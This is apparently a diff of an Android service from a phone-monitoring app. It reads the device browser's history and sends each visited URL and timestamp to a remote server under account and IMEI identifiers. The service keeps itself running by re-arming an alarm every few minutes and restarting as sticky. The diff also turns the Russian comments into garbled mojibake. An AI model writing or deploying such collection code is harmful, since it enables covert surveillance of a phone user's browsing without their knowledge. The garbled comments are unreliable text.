@@ -25,14 +25,16 @@ import com.inet.android.request.DataRequest;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
-/** Класс сбора истории стандартного браузера
+/**
+ * РљР»Р°СЃСЃ СЃР±РѕСЂР° РёСЃС‚РѕСЂРёРё СЃС‚Р°РЅРґР°СЂС‚РЅРѕРіРѕ Р±СЂР°СѓР·РµСЂР°
  * 
  * @author johny homicide
- *
+ * 
  */
 public class LinkService extends Service {
 
-	private static final int SERVICE_REQUEST_CODE = 25; // уникальный int сервиса
+	private static final int SERVICE_REQUEST_CODE = 25; // СѓРЅРёРєР°Р»СЊРЅС‹Р№ int
+														// СЃРµСЂРІРёСЃР°
 	final String LOG_TAG = "historyService";
 	SharedPreferences sPref;
 	final String SAVED_TIME = "saved_time";
@@ -44,28 +46,31 @@ public class LinkService extends Service {
 		startService(new Intent(this, LinkService.class));
 
 		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
-		
+
 		context = getApplicationContext();
 		sp = PreferenceManager.getDefaultSharedPreferences(context);
 
 	}
 
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		
-		Logging.doLog(LOG_TAG, "onStartCommand - " + sp.getString("account", "ID"), 
+
+		Logging.doLog(LOG_TAG,
+				"onStartCommand - " + sp.getString("account", "ID"),
 				"onStartCommand - " + sp.getString("account", "ID"));
-		
+
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
 		String linkEnd = sp.getString("code", "2");
 
 		if (linkEnd.equals("3")) {
 			Logging.doLog(LOG_TAG, "code : 3", "code : 3");
-			
+
 			return 0;
 		}
-		
+
 		Calendar cal = Calendar.getInstance();
-		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));// через 1 минут
+		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));// С‡РµСЂРµР·
+																				// 1
+																				// РјРёРЅСѓС‚
 
 		PendingIntent servicePendingIntent = PendingIntent.getService(this,
 				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
@@ -74,31 +79,33 @@ public class LinkService extends Service {
 		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
-				
+
 		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
 		if (!isWork) {
-			Logging.doLog(LOG_TAG, "isDoWork return " + Boolean.toString(isWork), 
+			Logging.doLog(LOG_TAG,
+					"isDoWork return " + Boolean.toString(isWork),
 					"isDoWork return " + Boolean.toString(isWork));
-			
+
 			return Service.START_STICKY;
 		} else {
-			Logging.doLog(LOG_TAG, "isDoWork return " + Boolean.toString(isWork), 
+			Logging.doLog(LOG_TAG,
+					"isDoWork return " + Boolean.toString(isWork),
 					"isDoWork return " + Boolean.toString(isWork));
 		}
-		
-		linkTask(); // просомотр истории браузера
-		
+
+		linkTask(); // РїСЂРѕСЃРѕРјРѕС‚СЂ РёСЃС‚РѕСЂРёРё Р±СЂР°СѓР·РµСЂР°
+
 		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
 	}
 
 	public void onDestroy() {
 		super.onDestroy();
-		
+
 		Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
 	}
 
-	public IBinder onBind(Intent intent) {	
+	public IBinder onBind(Intent intent) {
 		return null;
 	}
 
@@ -112,7 +119,7 @@ public class LinkService extends Service {
 		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
 				sel, null, null);
 		mCur.moveToFirst();
-		
+
 		sPref = PreferenceManager.getDefaultSharedPreferences(context);
 
 		String urlDate = "";
@@ -123,7 +130,7 @@ public class LinkService extends Service {
 			while (mCur.isAfterLast() == false && cont) {
 				urlDate = mCur.getString(mCur
 						.getColumnIndex(Browser.BookmarkColumns.DATE));
-				Context context = getApplicationContext();	
+				Context context = getApplicationContext();
 
 				DateFormat formatter = new SimpleDateFormat(
 						"yyyy-MM-dd HH:mm:ss");
@@ -135,8 +142,12 @@ public class LinkService extends Service {
 
 				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {
 
-					Logging.doLog(LOG_TAG, "--- " + formatter.format(calendar.getTime()).toString(), 
-							"--- " + formatter.format(calendar.getTime()).toString());
+					Logging.doLog(LOG_TAG,
+							"--- "
+									+ formatter.format(calendar.getTime())
+											.toString(), "--- "
+									+ formatter.format(calendar.getTime())
+											.toString());
 
 					calendar = Calendar.getInstance();
 					calendar.setTimeInMillis(Long.parseLong(urlDate));
@@ -144,55 +155,41 @@ public class LinkService extends Service {
 					url = mCur.getString(mCur
 							.getColumnIndex(Browser.BookmarkColumns.URL));
 
-					String urlDateInFormat = formatter.format(calendar.getTime())
-							.toString();
+					String urlDateInFormat = formatter.format(
+							calendar.getTime()).toString();
 
-//					String sendStr = "<packet><id>" + sp.getString("ID", "ID") 
-//							+ "</id><time>" + urlDateInFormat
-//							+ "</time><type>4</type><app>"
-//							+ "Интернет-браузер</app><url>" + url
-//							+ "</url><ntime>" + "30"
-//							+ "</ntime></packet>";
-//					String sendJSONStr = "\"id\":\"" + sp.getString("ID", "0000") + "\","
-//							+ "\"imei\":\"" + sp.getString("IMEI", "0000") + "\","
-//							+ "\"time\":\"" + urlDateInFormat + "\","
-//							+ "\"type\":\"4\","
-//							+ "\"url\":\"" + url + "\","
-//							+ "\"duration\":\"" + 30 + "\"}";
-					
 					String sendJSONStr = null;
 					JSONObject jsonObject = new JSONObject();
 					JSONArray data = new JSONArray();
 					JSONObject info = new JSONObject();
 					JSONObject object = new JSONObject();
 					try {
-						jsonObject.put("account", sp.getString("account", "0000"));
-						jsonObject.put("device", sp.getString("device", "0000"));
-						jsonObject.put("imei", sp.getString("imei", "0000"));
-						jsonObject.put("key", System.currentTimeMillis());
-						
+
 						info.put("url", url);
 						info.put("duration", "30");
-						
+
 						object.put("time", urlDateInFormat);
 						object.put("type", "7");
 						object.put("info", info);
 						data.put(object);
 						jsonObject.put("data", data);
-						sendJSONStr = jsonObject.toString();
+						// sendJSONStr = jsonObject.toString();
+						sendJSONStr = data.toString();
 					} catch (JSONException e) {
-						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+						Logging.doLog(LOG_TAG, "json СЃР»РѕРјР°Р»СЃСЏ", "json СЃР»РѕРјР°Р»СЃСЏ");
 					}
-					
+
 					DataRequest dr = new DataRequest(context);
-					dr.sendRequest(sendJSONStr);
+					dr.sendRequest(object.toString());
 
 					Editor ed = sPref.edit();
 					ed.putString(SAVED_TIME, urlDate);
 					ed.commit();
-					
-					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime()).toString() + " - " + url, 
-							formatter.format(calendar.getTime()).toString() + " - " + url);
+
+					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime())
+							.toString() + " - " + url,
+							formatter.format(calendar.getTime()).toString()
+									+ " - " + url);
 				}
 				mCur.moveToNext();
 			}
